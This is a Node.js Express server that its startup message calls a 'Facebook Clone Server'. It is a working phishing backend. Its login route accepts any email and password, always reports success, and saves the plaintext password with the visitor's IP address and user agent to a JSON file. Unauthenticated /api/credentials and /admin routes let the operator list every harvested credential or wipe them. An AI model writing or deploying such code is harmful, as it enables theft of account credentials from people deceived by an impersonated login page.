const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;
const DATABASE_FILE = path.join(__dirname, 'database.json');

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('.'));

// Utility function to read database
function readDatabase() {
    try {
        const data = fs.readFileSync(DATABASE_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.log('Creating new database file...');
        return [];
    }
}

// Utility function to write to database
function writeDatabase(data) {
    try {
        fs.writeFileSync(DATABASE_FILE, JSON.stringify(data, null, 2));
        return true;
    } catch (error) {
        console.error('Error writing to database:', error);
        return false;
    }
}

// Route to handle login and store credentials
app.post('/api/login', (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({
            success: false,
            message: 'Email and password are required'
        });
    }

    // Read current database
    const database = readDatabase();

    // Create new entry
    const loginEntry = {
        id: Date.now(),
        email: email,
        password: password,
        timestamp: new Date().toISOString(),
        ip: req.ip || req.connection.remoteAddress,
        userAgent: req.get('User-Agent')
    };

    // Add to database
    database.push(loginEntry);

    // Save to file
    const saved = writeDatabase(database);

    if (saved) {
        console.log(`New login stored: ${email} at ${loginEntry.timestamp}`);
        res.json({
            success: true,
            message: 'Login successful',
            user: {
                email: email,
                name: email.split('@')[0]
            }
        });
    } else {
        res.status(500).json({
            success: false,
            message: 'Database error'
        });
    }
});

// Route to get all stored credentials (admin view)
app.get('/api/credentials', (req, res) => {
    const database = readDatabase();
    res.json({
        success: true,
        count: database.length,
        credentials: database
    });
});

// Route to clear all credentials
app.delete('/api/credentials', (req, res) => {
    const cleared = writeDatabase([]);

    if (cleared) {
        res.json({
            success: true,
            message: 'All credentials cleared'
        });
    } else {
        res.status(500).json({
            success: false,
            message: 'Error clearing credentials'
        });
    }
});

// Route to serve admin interface
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Route to get server status
app.get('/api/status', (req, res) => {
    const database = readDatabase();
    res.json({
        success: true,
        message: 'Server is running',
        totalCredentials: database.length,
        lastLogin: database.length > 0 ? database[database.length - 1].timestamp : null
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({
        success: false,
        message: 'Something went wrong!'
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Facebook Clone Server running on http://localhost:${PORT}`);
    console.log(`📊 Admin interface: http://localhost:${PORT}/admin`);
    console.log(`💾 Database file: ${DATABASE_FILE}`);

    // Create database file if it doesn't exist
    if (!fs.existsSync(DATABASE_FILE)) {
        writeDatabase([]);
        console.log('✅ Created new database file');
    }
});